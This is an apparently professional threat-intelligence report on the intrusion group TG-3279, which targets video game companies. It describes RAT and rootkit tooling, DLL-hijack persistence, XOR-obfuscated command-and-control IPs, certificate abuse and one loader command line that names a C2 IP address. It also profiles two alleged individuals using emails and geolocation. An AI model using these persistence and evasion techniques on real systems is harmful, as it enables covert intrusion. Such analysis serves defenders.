registrations, collection dates of tools, the threat actors' activity on message
boards, and activity observed by Dell SecureWorks Counter Threat Unit™
(CTU™) researchers during incident response engagements, TG-3279 appears to
have been active since 2009.

CTU researchers believe that TG-3279 is associated with the China Cracking
Group and that the Laurentiu Moon and Sincoder personas are TG-3279 actors.
Due to information gathered from targeted hosts, CTU researchers believe with
medium confidence that TG-3279 focuses on the collection of video game
source code to crack those games for free use, to develop tools to cheat at
the games, or to use the source code for competing products. The best
method for detecting TG-3279 activity is to look for modifications to system
files, invalidly signed executables, and repeated non-existent domain
(NXDomain) DNS replies.

Known tools
The following tools are strong indicators of TG-3279 activity:

Conpee — A modular plugin-based remote access trojan (RAT) framework
that includes a "PlugMgr" component, which sometimes uses the filenames
mspatcher.dll or mspatch.dll. Newer variants of the Conpee installer include
a semi-custom PE-file loader.
gsi.exe — A system profiling tool compiled by Laurentiu Moon.
Etso — A tool that loads an executable remote access tool from multiple
registry keys.

Etso rootkit — A network and file hiding rootkit.
Runxx — A tool that loads PE files from its .rsrc section.

The following tools, authored by Sincoder but also shared publicly, may
indicate activity by TG-3279:

s — A custom, fast SYN port scanner.
sqlin.php — A PHP SQL injection script created on December 15, 2013.
dnsenum.py — A Python script used to enumerate DNS entries from a
word list.
rdp_crk — A Python script and executable to brute force Remote Desktop
Protocol (RDP) usernames and passwords.
icmp_shell — A reverse shell that runs on Windows hosts over ICMP
traffic.

Additional forked tool repositories in the Sincoder persona's GitHub repository
include the following:

Keylogger — A Linux kernel-based keylogger originally created by GitHub
user "enaudon."
Jynxkit — A Linux-based rootkit with a reverse-connecting SSL backdoor,
originally created by GitHub user "Chokepoint."
Gh0st — A common RAT.
NetCommander — An Address Resolution Protocol (ARP)-spoofing tool.
Carberp — A RAT that was popular years ago but is still in use.

TG-3279 has also been observed using popular public tools such as pwdump6.

Tactics
Through incident response engagements and open source research, CTU
researchers have gained insight into TG-3279 operations.

Reconnaissance
TG-3279 appears to perform reconnaissance on its targets via open source
research and network scanning.

Development
TG-3279 reuses some network infrastructure between attacks. Some IP
addresses used by the threat actors are shared by multiple domain names. Not
all domain names associated with those IP addresses are related to TG-3279
activity, and some may be non-malicious. The registration information for each
domain name used by TG-3279 tends to be unique and sometimes uses famous
names or names that appear to be intended as a joke. Much of the
registration information is cloned from legitimate companies such as Google or
Microsoft.

Weaponization
As of this publication, CTU researchers have not determined whether TG-3279
uses weaponization tools to package exploits with malware.

https://pdfmyurl.com/html-to-pdf-api?src=pdf
https://pdfmyurl.com/?src=pdf


Delivery
It appears that TG-3279 uses a port scanning tool named "s" and an RDP
brute force tool named "rdp_crk", which may be used to scan and exploit
targets.

Exploitation
As of this publication, CTU researchers have not discovered packaged exploits
used by TG-3279 and believe that the threat actors rely on active hands-on-
keyboard techniques to exploit targets.

Installation
CTU researchers have observed TG-3279 leveraging optionally loaded DLLs to
establish persistence for the Conpee plugin framework. This persistence
technique allows threat actors to add a file to the compromised host without
modifying the Windows Registry or startup items.

The optional DLL hijacking method used by TG-3279 placed the Conpee DLL
file on the compromised host as C:\Windows\wlbsctrl.dll. The Windows
operating system includes an option to start the "IKE and AuthIP IPSec Keying
Modules" service for load balancing if the host is configured to run this
service. This system-privileged, network-enabled service is controlled via the
ikeext.dll service DLL, which attempts to load wlbsctrl.dll. The legitimate version
of this file resides at C:\Windows\System32\wlbsctrl.dll. TG-3279 actors took
advantage of the file not existing on the host, and placed their DLL at

PDF generated automatically by the PDFmyURL HTML to PDF API

https://pdfmyurl.com/html-to-pdf-api?src=pdf
https://pdfmyurl.com/?src=pdf


C:\Windows\wlbsctrl.dll. The system loaded the file at this location when it did
not find the file at the legitimate location. On typical Windows 7 and 2008
systems, failure to load wlbsctrl.dll is not reported. CTU researchers discovered
that TG-3279 placed wlbsctrl.dll into C:\Windows\ and configured the "IKE and
AuthIP IPSec Keying Modules" service to run.

In other cases, TG-3279 actors modified the imports of legitimate DLLs to add
their malicious DLLs to the load process. For example, TG-3279 has modified
mspatcha.dll to import mspatcher.dll or msdomain.dll, both of which were the
malicious Conpee DLL file. When wuauserv.dll loads mspatcha.dll, the malicious
file is also loaded in the DLL import table.

TG-3279 has been able to install tools in these locations by compromising the
account credentials of users with administrator privileges.

Command and control
TG-3279 command and control (C2) communication often takes place over port
443 but is not HTTPS traffic. The traffic appears to be part of a larger
framework that the tool's authors named PATX. The C2 communications include
two notable aspects to complicate investigations: IP calculations and domain
name parking.

IP calculations

TG-3279 actors have adopted a form of IP calculation to obfuscate the true

https://pdfmyurl.com/html-to-pdf-api?src=pdf
https://pdfmyurl.com/?src=pdf


end point of their communications. This method of transforming the retrieved IP
address prevents detection by defenders who only resolve the hostnames used
in the tools. For example, one of TG-3279's C2 hosts is www7 . micorsofts .
com, which resolves to 230.165.22.199. In this instance, each byte of the IP
address's hexadecimal value is XOR-transformed with the value 0x88, so the
resulting network communications actually communicate to 110.45.158.79 (the
result of 230 ^ 0x88 . 165 ^ 0x88 . 22 ^ 0x88 . 199 ^ 0x88).

Domain name parking

TG-3279 actors appear to park the domain names used by their tools on non-
malicious IP addresses at different points in time to evade detection of the
actual IP addresses used in operations. For www7 . micorosofts . org and login
. 7unzip . org, TG-3279 removed the DNS resolution for the domains at least
three and four times respectively while the tools were installed on
compromised resources.

Actions on objective
In the operations observed by CTU researchers, TG-3279 maintained a long-
lived foothold within infiltrated organizations. CTU researchers have observed
TG-3279 actors refreshing their implanted tools with newer versions, including
versions that have been signed with valid certificates.

Certificate signing

PDF generated automatically by the PDFmyURL HTML to PDF API

https://pdfmyurl.com/html-to-pdf-api?src=pdf
https://pdfmyurl.com/?src=pdf


Windows 7 checks executable files for valid digital signatures from a set of
trusted Certificate Authorities (CAs). Files containing a signature from one of
these CAs can execute without prompting a user for permission. TG-3279 has
been observed using legitimately signed files on Windows 7 hosts. These files
were signed with a Chinese technology company's certificate on February 19,
2013, which is the same date that the files were written on the compromised
host. CTU researchers believe that TG-3279 compromised this signing
certificate because it was revoked on Tuesday, August 28, 2012. If a
compromised host has a current certificate revocation list (CRL), this signature
is flagged as invalid.

TG-3279 actors strive to access network and system administrators' accounts to
gain the most access to the target organization. After initial exploitation, TG-
3279 relies on a few key hosts (typically the hosts of system or network
administrators, document repositories, and domain controllers) to act as
beachheads running the Conpee or Etso tools. TG-3279 then adds scheduled
system tasks to other key resources within an organization to use compromised
credentials gathered from pwdump6.

CTU observations
During TG-3279 investigations, CTU researchers discovered evidence linking two
personas, Laurentiu Moon Colonce and Sincoder, to TG-3279 tool development
and infrastructure acquisition. TG-3279 activity has also revealed loose links to
the  group, but it is not clear as of this publication whether TG-3279 is
part of Winnti.

Actor profile: Laurentiu Moon Colonce
The first established persona related to the tools used by TG-3279 is Laurentiu
Moon, which is found in the program database (PDB) string of the gsi.exe
system profiling tool. The PDB stores debugging information for its program.
The PDB string is included at compilation time and provides insight into the
directory structure of the computer used to compile the executable. The
gsi.exe example shown in Figure 1 illustrates the use of the "laurentiumoon"
username on the originating host and shows that the original program was
named "getosinfo". According to the PETimeDateStamp, this example was
compiled on Sunday, October 30, 2011 at 16:42:30 UTC.

SecureWorks)

The Laurentiu Moon Colonce persona has many online profiles that contain
very little information, including a Steam Community online gaming account, a

, a list of CodeBeamer , and a 
 on a site about mobile phone jailbreaks and cracking. Additionally, the

laurentiumoon @ gmail . com email address was used to register an account on
rootkit.com, which used to be a bulletin board dedicated to discussing exploits
and rootkit development. In February 2011, Anonymous dumped the clear text
passwords of all rootkit.com users while compromising HBGary. There is also an

analyzing and building malicious software, as well as on reverse engineering
and cracking legitimate software.

Laurentiu Moon has also been active in the Chinese cracking and hacking
underground since at least 2009, based upon the threat actor's join dates on
the  online community, AntiGameProtect, and .
The China Cracking Group and AntiGameProtect are online communities
dedicated to cracking software digital rights management (DRM) mechanisms,
with a large focus on video games. Laurentiu Moon joined AntiGameProtect on
December 26, 2013 and has been active as recently as January 1, 2014 (see
Figure 2).

Actor profile: Sincoder (2bcoder)
Newer versions of the Conpee tool include a semi-custom PE loading method.
This method is functionally equivalent to at least two projects on GitHub: a
"sinpeloader" and a "PE-loader-sample." Additionally, some of the C2 domains
used in TG-3279 operations have shared the same IP address as the hostname
www . sincoder . com. CTU researchers discovered a GitHub account for a
user named "sincoder," which was active as recently as December 31, 2013.

The GitHub account followed and contributed to the following projects:

PE-loader-sample — A PE-loader that is functionally equivalent to the semi-
custom PE-loader found in the newer versions of Conpee. The original
owner of this GitHub project is a member of the 3sLabs company, which
is located in Bangalore, India.
sinpeloader — The Sincoder profile's development branch of the PE-
loader-sample project.
jynxkit — A Linux rootkit.
Multiple publicly available RATs, including Gh0st, LS4Ghost (the Linux server
for Gh0st), Carberp, and NetCommander.
Branches of other tools, including "keylogger," http_upload, sinarp (for ARP
poisoning), "s" port scanner, icmp_shell to provide a remote shell over
ICMP, UPX, and "nmap_scripts."

The sincoder GitHub account includes the 2bcoder @ gmail . com email
address. A related domain of 2bcoder . com is registered with the zhuxueao123
@ gmail.com email address. According to the sincoder account, the user is

https://pdfmyurl.com/?src=pdf


located in Shanghai, China. However, other evidence discussed below suggests
this information may not be accurate.

There is also a  for a user named 2bcoder that
references attending network security club meetings and has many Android
mobile device posts with geolocation information tagging for the Nanshan
District of Shenzhen. The Weibo account follows both the Wuhan University of
Technology and the Wuhan University Jingwei Forum.

Weibo microblogging profile

Like Laurentiu Moon, Sincoder is also a member of the China Cracking Group.
A  notes the persona's location as Shenzhen, China. The Twitter
profile does not have many public posts but follows security industry Twitter
accounts such as FireEye and SecurityTube, many penetration testers, and
offensive-security Twitter accounts such as Nikita Tarajanov from Russia and a
self-described " " based in
"cardaland" who posts in Russian.

Twitter account

Botmaster, TrueCrober, CreditCardFucker, Fraudmaster

Based upon the geolocation data associated with Weibo posts, the Sincoder
(2bcoder) threat actor appears to live near Kefa Road in the Nanshan District
of the Guangdong Province in Shenzhen, China as of this publication, and may
be affiliated with the Wuhan University of Technology. CTU researchers believe
the individual is pursuing a career in the information security industry. Based
upon the geolocation of older Weibo posts, Sincoder may have previously lived
in Beijing's Dongcheng District.

Potential links to TG-2633
In 2013, Kaspersky Lab produced a  on a group it named "Winnti" after
one of the tools the group uses. The CTU research team refers to the Winnti
group as TG-2633. The group targets video game companies and uses tools,
techniques, and procedures similar to those used by TG-3279:

report

Both groups have used executables signed with potentially compromised
certificates. The use of malware signed with valid certificates is one
technique used to circumvent protections included in recent versions of
the Windows operating system.
Both groups have used rootkits detected by antivirus (AV) vendors as
"winnti."
A Chinese technology company certificate that was used by TG-3279 was
used to sign a separate rootkit that AV vendors detect as "Etso" or
"winnti," which is associated with TG-2633. It is possible that the code
base used to create these rootkits has been shared within the Chinese
underground, leading to the same AV rule alerting on multiple tools, or
that this compromised certificate has been shared with multiple threat
groups.
Both groups target the video game industry. However, video game
companies appear to be common targets across the Chinese cracking
community.
Domain names used by the groups are loosely linked. TG-2633 uses a
7zbiz . org domain name, while TG-3279 uses a 7zunzip . com domain.
These domains have similar names that are based on the legitimate 7zip

tool, but there is no other information to connect these domains.
Both groups have used domain names based upon the Microsoft
trademark; however, this is an extremely common emulation among
malicious actors.

Although CTU researchers believe a connection between TG-3279 and TG-2633
is probable, there is no direct evidence to definitively link the two groups. The
following are possible relationships between the groups:

The threat actors in the two groups may have an indirect relationship.
TG-3279 threat actors may respect and emulate TG-2633, whose operating
procedures were detailed in April 2013.
Members of the groups may directly collaborate within the Chinese
cracking community by sharing code, tools, and signing certificates.
TG-3279 and TG-2633 may be part of the same overarching group.

Conclusion
TG-3279 actors have been observed compromising video game companies. The
following practices could prevent or detect successful intrusions:

Use host-based file profiling to look for new DLL files added to system
directories and modifications to the imports of existing files.
Maintain current certificate revocation lists and alert on files signed with
revoked certificates.
Monitor DNS lookup and alert on repeated NX-domains lookups. TG-3279

https://pdfmyurl.com/?src=pdf


often "turns off" the domain names used by its RATs.

CTU researchers believe with high confidence that the individuals behind the
Sincoder and Laurentiu Moon Colonce personas develop tools used by TG-
3279. Based on the online associations of these personas, an objective of
these compromises is likely to obtain inside information to crack the DRM
protections of the stolen software and to develop cheat patches. An alternative
objective may have been to obtain the source code of the gaming applications
to develop a similar product. CTU researchers believe that TG-3279 will
continue operations for the foreseeable future. Although there are similarities
between TG-3279 and TG-2633, also known as Winnti, CTU researchers have
not established a strong link between the groups as of this publication.

Appendix A: Tools
TG-3279 has been observed using the tools mentioned in the 
section.

Known tools

Conpee
Conpee is part of the "PATX" framework. The PlugMgr component, which
communications with the "PATX_SERVER" C2 host, offers a reasonably full range
of backdoor functionality, including the ability to load plugins with further
capabilities.

The built-in RAT functionality of the PlugMgr component includes the commands
listed in Table 1.

Table 2. PlugMgr component interaction commands.

Conpee includes limited error logging to a file named %s/%s_date.log.

In 2013, TG-3279 began using 64-bit custom packed versions of the Conpee
PlugMgr. These files are loaded via the XT load system described in the next
section.

XT load system
TG-3279 uses a custom form of PE loading that includes multiple files to load
executable code from an INI file. This XT code loading system is composed of
four files: gsi.exe, xt.bat, xt.tmp, and xt.ini.

gsi.exe

gsi.exe is an executable file that walks the process tree to find explorer.exe.
gsi.exe then saves the security identifier (SID) for explorer.exe to c:\\t.ini as the
value of the private profile string "App". This value is then used by the xt.tmp
executable file.

xt.bat

xt.bat is a batch script that calls the xt.tmp and xt.ini components of the XT
load system. The following is an example of xt.bat contents:

c:\recovery\xt.tmp c:\recovery\xt.ini -c 192.69.198.6 -o 443
PDF generated automatically by the PDFmyURL HTML to PDF API

https://pdfmyurl.com/html-to-pdf-api?src=pdf
https://pdfmyurl.com/?src=pdf


xt.tmp

xt.tmp is an executable file that loads the data within xt.ini and c:\t.ini via the
GetPrivateProfile API call.

xt.ini

xt.ini is an INI file that includes executable code within the "DATA" string. The
hexadecimal characters within the DATA string decode to the data in Figure 3.

Figure 3. Contents of the xt.ini file. (Source: Dell SecureWorks)

This routine decodes the imports for UPX from the obfuscated format in Figure
4 (four regular bytes followed by three garbage bytes), then repairs the
enclosed UPX stub within the DATA string and loads this PE file. To further
obfuscate the INI file from signature-based detections, the MZ header of the
UPX PE file is also nullified, as shown in Figure 5. When loaded, xt.ini is the
Conpee PlugMgr component.

Etso
The Etso tool used by TG-3279 is named TSMSISrv.dll. An older version of the
code reads executable code data from four values in the
HKLM\SOFTWARE\ODBC.INI registry key into memory buffers on the stack. The
newer version of this tool, which was released February 2013 or earlier, reads
the executable code from values stored in the non-malicious
HKLM\SOFTWARE\ODBC\ODBC.INI registry path. When executed, the data
loaded from the ODBC.INI values XOR-decodes a simple remote access tool
that provides backdoor command execution access to the compromised host.

Runxx.exe rsrc loader
Runxx.exe is a custom loader that runs the file encoded within the runxx.exe
executable's .rsrc section as the owner of the Explorer.exe process. CTU
researchers have observed the executable being named runxx.exe and st.exe.
The st.exe version, which is slightly different from runxx.exe, takes the
